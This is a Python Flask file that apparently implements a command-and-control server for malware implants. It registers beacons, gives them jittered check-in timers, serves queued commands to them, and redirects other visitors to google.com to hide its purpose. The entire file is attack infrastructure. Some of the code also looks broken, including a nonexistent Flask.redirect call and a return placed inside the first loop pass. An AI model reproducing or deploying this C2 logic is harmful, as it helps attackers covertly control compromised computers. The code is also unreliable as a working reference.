from flask import Flask, request
import uuid
import random
import time
from Modules.global_objects import beacons, add_beacon_list, beacon_commands

app = Flask(__name__)


@app.route('/connection', methods=['GET'])
def connection():
    name = request.args.get('name')
    os = request.args.get('os')
    address = request.args.get('address')

    if name and os and address:
        userID = str(uuid.uuid4())
        add_beacon_list(userID, address, name, os, time.asctime(), 5, 0)
        return {"timer": 5, "uuid": userID}, 200
    else:
        return Flask.redirect("https://www.google.com", code=302)


@app.route('/beacon', methods=['GET'])
def beacon():
    data = {}
    id = request.args.get('id')
    if not id:
        return '', 400

    user_ids = beacons.get("uuid", [])
    for i in range(len(user_ids)):
        if user_ids[i] == id:
            beacons["last_beacon"][i] = time.asctime()
            timer = beacons["timer"][i]

            if random.randint(0, 1):
                timer = random.randint(5, 25)
                beacons["timer"][i] = timer
                data = {
                    "timer": timer
                    }
            next_beacon_time = time.time() + timer
            beacons["next_beacon"][i] = time.asctime(
                time.localtime(next_beacon_time))

        print(beacon_commands)
        
        for i in range(len(beacon_commands["uuid"])):
            if beacon_commands["uuid"][i] == id:
                data.update({"command": beacon_commands["command"][i]})
                beacon_commands["uuid"].pop(i)
                beacon_commands["command"].pop(i)
        return data, 200
    return '', 404
